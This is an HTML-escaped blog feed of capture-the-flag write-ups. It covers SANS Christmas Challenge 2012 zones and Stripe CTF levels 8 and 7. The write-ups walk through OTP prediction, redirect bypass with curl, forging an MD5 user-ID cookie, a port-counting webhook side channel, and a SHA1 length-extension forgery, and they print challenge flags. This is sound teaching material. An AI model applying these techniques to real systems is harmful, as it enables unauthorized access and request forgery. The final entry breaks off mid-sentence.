            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;strtolower&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$inpass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nx"&gt;generate_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$stamp&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;TRUE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;FALSE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
        &lt;span class="nx"&gt;verify_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;verify_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_COOKIE&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nb"&gt;setcookie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;otp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;generate_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nb"&gt;header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Location: noaccess.php&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="nv"&gt;$accessallowed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;TRUE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nv"&gt;$zone&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="k"&gt;require_once&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;../include/template.inc.php&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now we know how the One Time Passwords are generated. We just have to
send the correct SHA1 sum, using the server's current time, which we can
find in the source code of the noaccess.php page.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="zone-5"&gt;
&lt;h3&gt;Zone 5&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;3ab1c5fa327343721bc798f116be8dc6&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Game over for the North Pole.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="heat-miser"&gt;
&lt;h2&gt;&lt;a class="reference external" href="http://heatmiser.counterhack.com/"&gt;Heat Miser&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="id1"&gt;
&lt;h3&gt;Zone 0&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;1732bcff12e6550ff9ea44d594001418&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We had a security concern where the Zone 1 URL ended up in search
engine results. We added a file to prevent the search engines from
caching these pages. The system is now secure an no unauthorized
users have access to the URL.&lt;/p&gt;
&lt;p&gt;Don't even try to access the other zones, because you won't be able
to. And if you are helping my brother, GO AWAY!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The important part here is the file to prevent indexing by search
engines. Heat Miser is talking about the robots.txt file, which tells
search engine crawlers what page they can crawl. By loading this file,
we find the wanted URL: zone-1-E919DBF1-E4FA-4141-97C4-3F38693D2161.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id2"&gt;
&lt;h3&gt;Zone 1&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;d8c94233daef256c42bb95bd61382e02&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
We had an issue with Zone 2 and we had to temporarily remove the
link. It is now back and in full operation. We appoligize to those
living in Zone 2 as it may have gotten a tad chilly. Everything is
fully operational now.&lt;/blockquote&gt;
&lt;p&gt;Looking at the comment will give you the URL to the next zone:
zone-2-761EBBCF-099F-4DB0-B63F-9ADC61825D49&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id3"&gt;
&lt;h3&gt;Zone 2&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;ef963731de7e886226fe4a6a6c2971f1&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
We are sorry, but due to the negligence of one of our fiery minions,
we had to change the link for Zone 3. If you should have access then
you should have received an email. The new zone 3 link starts with
zone-3-83FEE8BE-B1C6-4395-A56A-XXXXXXXXXXXX.&lt;/blockquote&gt;
&lt;p&gt;There are 281,474,976,710,656 possibilities for the last set of numbers,
so don't bother brute forcing it. Once again, we have an incomplete URL.
But Heat Miser tweets this message:&lt;/p&gt;
&lt;img alt="heat_miser_tweet_1.png" class="align-center" src="/images/sans-christmas-challenge-2012/heat_miser_tweet_1.png" /&gt;
&lt;p&gt;The tweeted image is:&lt;/p&gt;
&lt;img alt="heat_miser_transparent_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2012/heat_miser_transparent_terminal.png" /&gt;
&lt;p&gt;And, as Snow Miser says:&lt;/p&gt;
&lt;img alt="snow_miser_tweet_2.png" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_tweet_2.png" /&gt;
&lt;p&gt;This is looks just like the first level of Snow Miser. Using GIMP, we
can make the end of the URL appear:&lt;/p&gt;
&lt;img alt="heat_miser_transparent_terminal_enhanced.png" class="align-center" src="/images/sans-christmas-challenge-2012/heat_miser_transparent_terminal_enhanced.png" /&gt;
&lt;p&gt;Which gives us the URL: zone-3-83FEE8BE-B1C6-4395-A56A-BF933FC85254&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id4"&gt;
&lt;h3&gt;Zone 3&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;0d524fb8d8f9f88eb9da5b286661a824&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We added a new security mechanism to Zone 4 so it won't matter if
SOMEONE LEAKS IT AGAIN!&lt;/p&gt;
&lt;p&gt;Zone 4 (zone-4-0F2EA639-19BF-40DD-A38D-635E1344C02B)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We can directly access zone 4, since Heat Miser posts a link to it. But
when we click it, we're redirected to another page, noaccess.php. The
hint comes from a tweet from Snow Miser:&lt;/p&gt;
&lt;img alt="snow_miser_tweet_3.png" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_tweet_3.png" /&gt;
&lt;p&gt;The tweeted image is from &lt;a class="reference external" href="http://knowyourmeme.com/memes/the-most-interesting-man-in-the-world"&gt;the most interesting man in the
world&lt;/a&gt;:&lt;/p&gt;
&lt;img alt="snow_miser_most_interesting_man.jpg" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_most_interesting_man.jpg" /&gt;
&lt;p&gt;Heat Miser redirects us, using a &lt;code&gt;header(&amp;quot;location: new_url&amp;quot;);&lt;/code&gt;, but
forgets to use the &lt;code&gt;exit&lt;/code&gt; function. It
means that the rest of the page is executed, then sent to our browser,
with a Location header, which our browser follows. But if we use a
client which does not follow redirection, we can recover the first page.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;curl &lt;span class="s2"&gt;&amp;quot;http://heatmiser.counterhack.com/zone-4-0F2EA639-19BF-40DD-A38D-635E1344C02B/&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;zone-5&amp;quot;&lt;/span&gt;
Link to &amp;lt;a &lt;span class="nv"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/zone-5-15614E3A-CEA7-4A28-A85A-D688CC418287/&amp;quot;&lt;/span&gt;&amp;gt;Zone 5&amp;lt;/a&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="id5"&gt;
&lt;h3&gt;Zone 4&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;e3ae414e6d428c3b0c7cff03783e305f&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Okay, we have the URL to zone 5, but when we try to access it directly,
we're redirected again to noaccess.php. To give us a clue about where to
look, Snow Miser tweets:&lt;/p&gt;
&lt;img alt="snow_miser_tweet_4.png" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_tweet_4.png" /&gt;
&lt;p&gt;So, we know that we should look at the cookies. There's only one:
&lt;code&gt;UID=b8c37e33defde51cf91e1e03e51657da&lt;/code&gt;. A 32 byte hex string:
it looks like a MD5 hash. If we reverse it (using online tools, or
programs like John The Ripper), we find that it's the hash of the string
&amp;quot;1001&amp;quot;, which explains Snow Miser's tweet.&lt;/p&gt;
&lt;p&gt;A value like 1001, and a name like UID indicates that this hash
corresponds to a user ID, and an unprivileged one, since he can't access
zone 5. The first value I tried was a UID of 0 (which means a MD5 of
&lt;code&gt;cfcd208495d565ef66e7dff9f98764da&lt;/code&gt;) since it's root's UID on
Linux, but it turned out that the correct value was 1 (which means a MD5
&lt;code&gt;c4ca4238a0b923820dcc509a6f75849b&lt;/code&gt;). We modify the cookie's
value, and we reload the page to access zone 5.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="id6"&gt;
&lt;h3&gt;Zone 5&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;f478c549e37fa33467241d847f862e6f&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Game over for Southtown.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="conclusion"&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;I'll give it to you: this challenge wasn't really complicated. Mostly
because the first zones of both controllers where kinda easy, but also
because of all the hints in the tweets. Yet, I'm still glad I did it
because:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;I learned the SVN vulnerability&lt;/li&gt;
&lt;li&gt;I learned common mistakes, like forgetting &lt;code&gt;exit&lt;/code&gt; after a
redirect&lt;/li&gt;
&lt;li&gt;I added new tricks to my &amp;quot;to-do&amp;quot; list when looking for
vulnerability/information disclosure (like the use of steghide, or
looking at files in docs leaks)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I hoped this wasn't too long, and that you learned something from it. I
wish you a merry Christmas, a happy new year, and lots of pentesting ;)&lt;/p&gt;
&lt;p&gt;Cheers.&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Stripe CTF: Level #8</title><link href="https://allyourbase.utouch.fr/posts/2012/12/15/stripe-ctf-level-8/" rel="alternate"></link><updated>2012-12-15T20:06:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-12-15:posts/2012/12/15/stripe-ctf-level-8/</id><summary type="html">&lt;img alt="level08-logo.jpg" class="align-center" src="/images/stripe-ctf-level-8/level08-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-8/stripe-ctf-level08.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;d211aa240a0a59eb1f56d3c42a55080d0e27eea2c04bc4410bf608824c847c96&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This is it. The final level to the Stripe CTF. The goal here is to
retrieve a 12-digit password, which is too long to brute force. Let's
see how we can use the protocol to our advantage.&lt;/p&gt;
&lt;p&gt;The infrastructure looks like this:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;a central server, used to verify the password&lt;/li&gt;
&lt;li&gt;four &amp;quot;chunk&amp;quot; servers, which each knows only a part of the password&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;When you send a password to the central server, it cuts it in four
pieces, and procedes like this:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;it asks the first chunk server if the first piece is correct&lt;/li&gt;
&lt;li&gt;if not, it sends a failure message to the client (and doesn't contact
any other chunk server)&lt;/li&gt;
&lt;li&gt;if it is, it asks the second chunk server if the second piece is
correct&lt;/li&gt;
&lt;li&gt;etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Furthermore, we can give the server a list of webhooks, to which it'll
send the result.&lt;/p&gt;
&lt;p&gt;Seeing the password verification protocol, I know what you're thinking:
timing attack. Seeing how much time the server takes to respond, we can
find how many chunk servers it contacted, thus how many chunk we
&lt;span class="formula"&gt;10&lt;sup&gt;12&lt;/sup&gt;&lt;/span&gt; possibilities, we're down to
&lt;span class="formula"&gt;4â€…Ã—â€…10&lt;sup&gt;3&lt;/sup&gt;&lt;/span&gt; possibilities, which is feasible.&lt;/p&gt;
&lt;p&gt;The problem is that the server has a way to prevent timing attack:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# File primary_server, line 58&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;nextServerCallback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;parsed_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c"&gt;# Chunk was wrong!&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;parsed_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;success&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
        &lt;span class="c"&gt;# Defend against timing attacks&lt;/span&gt;
        &lt;span class="n"&gt;remaining_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expectedRemainingTime&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;log_info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;Going to wait &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt; seconds before responding&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;
        &lt;span class="n"&gt;remaining_time&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;reactor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;callLater&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;remaining_time&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendResult&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt;

    &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;checkNext&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If a chunk is wrong, the server waits before telling the client he made
a mistake. So we can't use a timing attack.&lt;/p&gt;
&lt;p&gt;But there is another way to know how many chunk servers the primary
contacted, and thus go from &lt;span class="formula"&gt;10&lt;sup&gt;12&lt;/sup&gt;&lt;/span&gt; to &lt;span class="formula"&gt;4â€…Ã—â€…10&lt;sup&gt;3&lt;/sup&gt;&lt;/span&gt;
the webhooks. Here is the idea:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;when the primary server communicates with an external resource
(whether it's a chunk server or a webhook), it opens a socket&lt;/li&gt;
&lt;li&gt;every time the primary server opens a socket, its client port is
incremented by one&lt;/li&gt;
&lt;li&gt;the webhook knows the client port of the primary server&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So, by looking at how much was the client port incremented between two
responses, the webhook knows how many chunk servers were contacted.
Indeed, let's say the first chunk is wrong: the primary server connects
to the first chunk server, then to the webhook. The port is therefore
incremented by two. If the first chunk is correct, but not the second is
wrong, the primary servers contacts the first chunk server, the second
chunk server, then the webhook. The port is incremented by three, etc.&lt;/p&gt;
&lt;p&gt;So, knowing this we can't find the correct chunks, but we can eliminate
the bad chunks, which is faster than bruteforcing the whole password,
but still takes a lot of time. What's more, the primary server can only
contact webhooks with URL ending with .stripe-ctf.com (in the production
environment). Fortunately, we still have access to the level 2 server
(remember, the one with the upload vulnerability?) We can upload an SSH
key, connect, and then launch our webhook.&lt;/p&gt;
&lt;p&gt;Unfortunately, I lost the source code of my custom webhook (sorry about
that!). It was based on a webhook coded by a friend of Lopi. Basically,
it tried every possible combination, chunk by chunk, and eliminated the
bad ones as it did so.&lt;/p&gt;
&lt;p&gt;The attack took something like two days, because I kept being
disconnected of the server, and because there were so many people on it
running their own webhook. I think it was kind of stubborn from Stripe
to force the webhook to be on one of their server.&lt;/p&gt;
&lt;img alt="level08-scumbag-stripe.png" class="align-center" src="/images/stripe-ctf-level-8/level08-scumbag-stripe.png" /&gt;
&lt;p&gt;Anyway, after some time, you find the correct password, which you submit
to the Stripe web site.&lt;/p&gt;
&lt;img alt="level08-w00t.png" class="align-center" src="/images/stripe-ctf-level-8/level08-w00t.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
&lt;p&gt;That's it for the Stripe CTF! I know I took a lot of time writing these
write ups, but I learned a lot from this competition, especially the
SHA1 padding attack, how to find where to put my Javascript so it's
executed, and how to obfuscate it. Plus I won a super cool t-shirt!&lt;/p&gt;
&lt;p&gt;See you for another CTF!&lt;/p&gt;
&lt;img alt="stripe-ctf-prize.jpg" class="align-center" src="/images/stripe-ctf-level-8/stripe-ctf-prize.jpg" /&gt;
</summary></entry><entry><title>Stripe CTF: Level #7</title><link href="https://allyourbase.utouch.fr/posts/2012/12/09/stripe-ctf-level-7/" rel="alternate"></link><updated>2012-12-09T15:07:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-12-09:posts/2012/12/09/stripe-ctf-level-7/</id><summary type="html">&lt;img alt="level07-logo.jpg" class="align-center" src="/images/stripe-ctf-level-7/level07-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-7/stripe-ctf-level07.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256:
&lt;code&gt;d497f25a620a2ad5e3850bf642cfc1df988e32b612d06f48fffa271912726e86&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level is the most delicious of all: you can order waffles online,
and the company will have them delivered to the location you specified.
There are seven types of waffle: veritaffle, belgian, brussels, eggo,
chicken (premium), dream (premium), and the king of waffles, liege
(premium). You have an unprivileged account (login: ctf, password:
password), so you can't order premium waffles. Yet, your goal is to
order the supreme waffle: the liege. There are four other users on the
website: larry (premium account), randall (premium account), alice and
bob. Every user has an ID, and a secret (which has the form of a random
string).&lt;/p&gt;
&lt;img alt="level07-ctf-user-interface.png" class="align-center" src="/images/stripe-ctf-level-7/level07-ctf-user-interface.png" /&gt;
&lt;p&gt;The company provides you with a client API you can use to order waffles.
Every order is of the form:
&lt;code&gt;count=XXX&amp;amp;lat=XXX&amp;amp;user_id=XXX&amp;amp;long=XXX&amp;amp;waffle=XXX&lt;/code&gt;. Then, a
signature is computed using the client's secret, and appended to the
order. The signature is of the form:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# File client.py, line 61&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_signature&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;api_secret&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c"&gt;# signature = SHA1(secret + message)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can view our past orders at the URL /logs/id.&lt;/p&gt;
&lt;img alt="level07-ctf-order.png" class="align-center" src="/images/stripe-ctf-level-7/level07-ctf-order.png" /&gt;
&lt;p&gt;But what if we change the ID in the URL?&lt;/p&gt;
&lt;img alt="level07-larry-order.png" class="align-center" src="/images/stripe-ctf-level-7/level07-larry-order.png" /&gt;
&lt;img alt="level07-barry-order.png" class="align-center" src="/images/stripe-ctf-level-7/level07-barry-order.png" /&gt;
&lt;p&gt;Bingo, we are now viewing larry's and randall's past orders. But since
they didn't order any liege, we can't use these orders as is. Let's see
in the code how the order is checked:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# File wafflecopter.py, line 139&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;parse_params&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;raw_params&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;pairs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;raw_params&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;amp;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;params&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;pair&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;pairs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pair&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unquote_plus&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;val&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;unquote_plus&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;val&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;That's the code which parse the body of the order. We can see that they
don't check if a parameter has been specified more than once. So if you
send an order of the form: &lt;code&gt;count=XXX&amp;amp;lat=XXX&amp;amp;user_id=XXX&amp;amp;long=XXX&amp;amp;waffle=XXX&amp;amp;waffle=YYY&lt;/code&gt;,
the last waffle will be ordered (in this case, YYY).&lt;/p&gt;
&lt;p&gt;Great, so we can just take a previous order from larry, append
&lt;code&gt;&amp;amp;waffle=liege&lt;/code&gt; to the end, and send it to the server!
Actually, we can't, because of the signature: if we change the order,
but not the signature, they won't match, and the server will refuse to
carry our order. So we need to change the signature. But how can we do
that without knowing larry's secret? The key here is cryptography.&lt;/p&gt;
&lt;p&gt;Like we said earlier, the signature is computed via &lt;code&gt;SHA1(secret +
message)&lt;/code&gt;. But the SHA1 function follows the &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction"&gt;Merkleâ€“DamgÃ¥rd
construction&lt;/a&gt;.
Basically, the message is broken up in equal blocks of 512 bits. Then,
computation is done on the first block and produces an output. This
output is used to perform the same computation on the second block, and
so on. So, it means that given &lt;code&gt;SHA1(secret + message)&lt;/code&gt; and the
and the length of &lt;code&gt;secret&lt;/code&gt;, we can compute &lt;code&gt;SHA1(secret + message +
message_modifier)&lt;/code&gt;. And that's exactly what we want, to append
something (here, &lt;code&gt;&amp;amp;waffle=liege&lt;/code&gt;) at the end of the message.&lt;/p&gt;
&lt;p&gt;I started searching for a Python implementation of SHA1, and wanted to
modify it so that it would compute my forged signature, but it took too
much time. Fortunately, two guys I was working with on the CTF,
